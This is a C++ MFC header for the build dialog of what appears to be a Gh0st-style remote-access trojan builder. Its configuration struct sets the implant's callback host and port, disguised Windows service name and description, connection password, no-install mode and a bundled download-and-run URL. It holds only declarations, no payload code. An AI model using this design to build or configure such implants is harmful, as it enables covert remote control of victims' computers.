#if !defined(AFX_BUILDDLG_H__77F21CCD_63BA_4FC2_B85E_3F5567CB925D__INCLUDED_)
#define AFX_BUILDDLG_H__77F21CCD_63BA_4FC2_B85E_3F5567CB925D__INCLUDED_

#if _MSC_VER > 1000
#pragma once
#endif // _MSC_VER > 1000
// BuildDlg.h : header file
//

/////////////////////////////////////////////////////////////////////////////
// CBuildDlg dialog
struct DLL_INFO
{
	char LoginAddr[100];    //上线地址
	UINT LoginPort;
	char ServiceName[50];//服务名称
	char ServiceDisplayName[50]; //服务显示
	char ServiceDescription[150];  //服务描述
	char UpGroup[32];       //分组
	char strRemark[32];     //备注
	BOOL NoInstall;        // TRUE 绿色安装, FALSE 正常
	char ConnetPass[20];
	BOOL Dele_Kzj;                //离线记录
	CHAR szDownRun[300];     //捆绑地址
};
class CBuildDlg : public CDialog
{
// Construction
public:
	CBuildDlg(CWnd* pParent = NULL);   // standard constructor

	void TestMaster(char * strIP,UINT nPort) ;
// Dialog Data
	//{{AFX_DATA(CBuildDlg)
	enum { IDD = IDD_DIALOG_BUILD };
	CEdit	m_edit_log;
	CComboBox	m_group_name;
	CString	m_edit_host;
	CString	m_service_name;
	CString	m_service_displayname;
	CString	m_service_description;
	BOOL	m_check_noinstall;
	BOOL	m_zkfkzj;
	CString	m_edit_remark;
	UINT	m_edit_port;
	BOOL	Pattern;
	CString	m_edit_kb;
	BOOL	m_kbcheck;
	//}}AFX_DATA
	BOOL bIsDllinfo;
	DLL_INFO m_dll_info;
	ClientContext* m_pContext;
	CIOCPServer* m_iocpServer;
// Overrides
	// ClassWizard generated virtual function overrides
	//{{AFX_VIRTUAL(CBuildDlg)
	protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV support
	//}}AFX_VIRTUAL

// Implementation
protected:
	char DatPath[MAX_PATH];
    char patht[MAX_PATH];
	// Generated message map functions
	//{{AFX_MSG(CBuildDlg)
	virtual BOOL OnInitDialog();
	virtual void OnOK();
	afx_msg void OnCheckNoinstall();
	afx_msg BOOL CreateServer(DLL_INFO *lpData,LPSTR szPath,char *datPaths);
	afx_msg void OnPaint();
	afx_msg void OnButtonTestConnect();
	afx_msg void OnRandom();
	afx_msg HBRUSH OnCtlColor(CDC* pDC, CWnd* pWnd, UINT nCtlColor);
	afx_msg void OnPattern();
	afx_msg void OnKbtest();
	afx_msg void OnKbcheck();
	void LogOut(LPCSTR outtext);


	//}}AFX_MSG
	DECLARE_MESSAGE_MAP()
};

//{{AFX_INSERT_LOCATION}}
// Microsoft Visual C++ will insert additional declarations immediately before the previous line.

#endif // !defined(AFX_BUILDDLG_H__77F21CCD_63BA_4FC2_B85E_3F5567CB925D__INCLUDED_)
